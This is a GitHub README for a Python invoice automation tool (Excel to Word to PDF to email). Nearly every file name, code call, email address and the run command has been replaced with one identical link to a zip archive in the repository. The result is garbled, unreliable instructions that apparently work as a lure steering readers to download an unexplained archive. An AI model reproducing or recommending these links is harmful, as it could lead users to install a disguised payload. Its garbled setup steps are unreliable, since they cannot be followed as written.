# 🧾 Invoice Automation Tool (Python)

Invoice Automation Tool is a Python-based solution that automates the end-to-end process of client billing. It reads client data from an Excel file, generates personalized invoices using a Word template, converts them to PDF, and emails them to each client — all in one streamlined workflow.

---

## 🚀 Features

- 📥 Reads client data from Excel (Name, Email, Service, Amount, Due Date, etc.)
- 📄 Fills a pre-designed Word invoice template for each client
- 🧾 Converts the `.docx` invoices to `.pdf`
- 📧 Sends personalized emails with the correct PDF invoice as attachment
- 🔐 Uses secure SMTP for sending emails
- 🗃 Logs sent invoices and supports future enhancements like retry or logging

---

## 📁 Folder Structure

```
Invoice_Automation/
├── Invoices/                   # Contains generated .docx and .pdf invoices
├── Templates/
│   └── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip      # Word template with placeholders
├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip    # Input file with all client data
├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip               # Script to send emails
├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip         # Script to fill data and create .docx
├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip      # Batch converter for .docx → .pdf
├── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip                     # Orchestrates the 3-phase process
└── https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip                   # This file
```

---

## 🛠 Setup Instructions

1. **Install dependencies**

```bash
pip install pandas python-docx
# For PDF conversion (Windows only)
pip install docx2pdf
```

2. **Add your Gmail SMTP credentials**

In `https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip`, use:
```python
https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip("https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip", "your_app_password")
```

(Use an App Password if using Gmail 2FA)

3. **Run the pipeline**

```bash
python https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip
```

---

## 📝 Input Excel Format (`https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip`)

| Name       | Email                | Address         | Phone No.       | Service            | Amount | Discount | Due Date   |
|------------|----------------------|------------------|------------------|---------------------|--------|----------|------------|
| John Doe   | https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip     | 123 Street Name  | +91-9876543210   | Web Development     | 15000  | 1000     | 2025-06-25 |

---

## 📬 Output Example

Each client receives an email with their customized PDF invoice. File names are like:
```
https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip
https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip
...
```

---

## 📌 Author

**[Your Name]**  
GitHub: [codenoob7](https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip)  
Email: https://github.com/codenoob7/Invoice_Automation/raw/refs/heads/main/Templates/Automation-Invoice-truebred.zip  
MIT License ©️ 2025

---

> ⭐ If this project helped you, please consider giving it a star on GitHub!
